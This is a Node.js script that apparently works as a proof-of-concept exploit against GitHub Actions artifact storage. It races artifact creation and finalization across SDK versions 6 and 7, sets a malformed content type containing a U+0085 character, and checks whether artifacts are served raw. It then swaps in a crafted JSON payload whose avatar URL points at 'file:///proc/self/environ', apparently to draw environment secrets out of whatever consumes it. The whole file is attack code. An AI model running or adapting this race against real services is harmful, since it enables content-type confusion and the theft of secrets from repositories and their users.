import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient();
const weird = '\u0085application/json';
const repositoryName = process.env.GITHUB_REPOSITORY;
const apiToken = process.env.GH_TOKEN;

function payload(artifactId) {
  return Buffer.from(JSON.stringify({
    full_name: `${repositoryName}/actions/artifacts/${artifactId}/zip`,
    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
    description: 'Repo Cassette public exact SDK race',
    stargazers_count: 0,
  }));
}

async function create(name, version, mime) {
  const result = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    version,
    mimeType: StringValue.create({ value: mime }),
  });
  if (!result.ok) throw new Error('CreateArtifact returned ok=false');
  return result;
}

async function upload(url, bytes) {
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: { blobContentType: weird },
  });
}

async function finalize(name, bytes) {
  const hash = createHash('sha256').update(bytes).digest('hex');
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name,
    size: String(bytes.length),
    hash: StringValue.create({ value: `sha256:${hash}` }),
  });
  if (!result.ok) throw new Error('FinalizeArtifact returned ok=false');
  return String(result.artifactId);
}

async function inspect(id) {
  const url = `https://api.github.com/repos/${repositoryName}/actions/artifacts/${id}/zip`;
  for (let attempt = 0; attempt < 3; attempt += 1) {
    const response = await fetch(url, {
      redirect: 'manual',
      headers: {
        Authorization: `Bearer ${apiToken}`,
        Accept: 'application/vnd.github.v3+json',
        'User-Agent': 'repo-cassette-public-race-probe',
      },
    });
    if (response.status === 302) {
      const location = response.headers.get('location');
      if (!location) return { id, status: 302, rsct: null, raw: false };
      const rsct = new URL(location).searchParams.get('rsct');
      if (rsct === 'application/json' || rsct === 'application/zip') {
        return { id, status: 302, rsct, raw: false };
      }
      const blob = await fetch(location);
      const body = Buffer.from(await blob.arrayBuffer());
      return { id, status: blob.status, rsct, contentType: blob.headers.get('content-type'),
        raw: body.equals(Buffer.from('{"probe":"placeholder"}')) };
    }
    if (response.status !== 404) return { id, status: response.status, rsct: null, raw: false };
    await new Promise(resolve => setTimeout(resolve, 400));
  }
  return { id, status: 404, rsct: null, raw: false };
}

async function race(index) {
  const name = `cassette-race-${index}-${Date.now()}`;
  const reverse = index % 2 === 1;
  const specs = reverse
    ? [[7, 'application/json'], [6, weird]]
    : [[6, weird], [7, 'application/json']];

  // The race confuses the v6 MIME metadata with the v7 raw delivery mode.
  const created = await Promise.all(specs.map(([version, mime]) => create(name, version, mime)));
  const placeholder = Buffer.from('{"probe":"placeholder"}');
  await Promise.all(created.map((item) => upload(item.signedUploadUrl, placeholder)));
  const finalized = await Promise.allSettled([
    finalize(name, placeholder),
    finalize(name, placeholder),
  ]);
  const artifactIds = [...new Set(finalized
    .filter((result) => result.status === 'fulfilled')
    .map((result) => result.value))];
  if (!artifactIds.length) throw new Error('Both FinalizeArtifact calls failed');

  const representations = await Promise.all(artifactIds.map(inspect));
  const mixed = representations.find(item => item.raw && item.contentType?.includes('\u0085'));
  const artifactId = mixed?.id ?? artifactIds.at(-1);
  const body = payload(artifactId);
  await Promise.all(created.map((item) => upload(item.signedUploadUrl, body)));
  if (mixed) console.log(`MIXED ${JSON.stringify({ artifactId, rsct: mixed.rsct,
    contentType: mixed.contentType, payloadSha256: createHash('sha256').update(body).digest('hex') })}`);
  return { name, artifactId, artifactIds, reverse,
    representations: representations.map(item => ({id: item.id, status: item.status, rsct: item.rsct, raw: item.raw})),
    repository: `${repositoryName}/actions/artifacts/${artifactId}/zip` };
}

const results = [];
for (let index = 0; index < 32; index += 1) {
  try {
    const result = await race(index);
    results.push(result);
    console.log(`BUILT ${JSON.stringify(result)}`);
  } catch (error) {
    console.log(`SKIPPED race ${index}: ${error.message}`);
  }
}

if (!results.length) throw new Error('No race artifact could be created');
console.log(`MANIFEST ${JSON.stringify(results)}`);
